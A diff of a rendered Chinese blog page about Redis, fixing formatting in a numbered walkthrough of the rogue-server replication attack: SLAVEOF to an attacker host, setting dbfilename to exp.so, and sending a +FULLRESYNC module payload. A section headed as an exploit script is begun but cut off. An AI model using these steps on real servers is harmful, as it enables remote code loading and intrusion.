@@ -254,7 +254,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Redis/" style="color: #ff7d73">Redis</a>
+                <a href="/blog/tags/Redis/" style="color: #00bcd4">Redis</a>
             </span>
             
         </span>
@@ -277,7 +277,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">10分</span>
+        <span class="post-count">9分</span>
       </span>
     </span>
     
@@ -461,17 +461,13 @@ REPLCONF 发送REPLCONF capa
 PSYNC &lt;rundi&gt; &lt;offest&gt; 发送PSYNC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 </li>
 <li><p>将要攻击的redis服务器设置成我们的slave</p>
-<pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">   SLAVEOF ip port
-
-3. 设置RDB文件（注意以下exp.so是不能包含路径的，如果需要设置成其它目录请用&#96;config set dir path&#96;）
-
-   &#96;&#96;&#96;redis
-   config set dbfilename exp.so
-
-4. 告诉slave使用全量复制并从我们配置的Rouge Server接收module（其中&#96;&lt;runid&gt;&#96;无要求，不过长度一般为40，&#96;&lt;offest&gt;&#96;一般设置为1）
-
-   &#96;&#96;&#96;redis
-   +FULLRESYNC &lt;runid&gt; &lt;offest&gt;\r\n$&lt;len(payload)&gt;\r\n&lt;payload&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">SLAVEOF ip port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>设置RDB文件（注意以下exp.so是不能包含路径的，如果需要设置成其它目录请用<code>config set dir path</code>）</p>
+<pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">config set dbfilename exp.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>告诉slave使用全量复制并从我们配置的Rouge Server接收module（其中<code>&lt;runid&gt;</code>无要求，不过长度一般为40，<code>&lt;offest&gt;</code>一般设置为1）</p>
+<pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">+FULLRESYNC &lt;runid&gt; &lt;offest&gt;\r\n$&lt;len(payload)&gt;\r\n&lt;payload&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ol>
 <hr>
 <h2 id="某exp"><a href="#某exp" class="headerlink" title="某exp"></a>某exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
